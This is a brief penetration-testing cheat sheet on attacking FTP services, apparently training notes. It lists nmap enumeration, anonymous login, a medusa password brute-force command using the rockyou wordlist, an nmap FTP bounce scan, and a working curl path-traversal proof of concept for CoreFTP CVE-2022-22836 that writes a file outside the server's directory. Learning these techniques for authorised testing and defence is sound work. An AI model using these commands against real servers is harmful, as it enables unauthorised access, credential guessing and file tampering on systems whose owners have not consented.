# Attacking FTP
```bash
sudo nmap -sC -sV -p 21 <ip> # Enumeration

## Anonymous Authentication
ftp <ip>  
Name (<ip>:kali): anonymous
Password:<empty>
get # download
mget # download multiple files
put # upload file

## Brute Forcing
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h <ip> -M ftp 

## FTP Bounce Attack
nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2 # 80 open
```

## Latest FTP Vulnerabilities

```bash
#  CoreFTP Exploitation 
## CoreFTP before build 727 (CVE-2022-22836)
# This vulnerability allows us to write files outside the directory to which the service has access.
# he CoreFTP service allows an HTTP `PUT` request, which we can use to write content to files
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
type C:\whoops #=> PoC.
```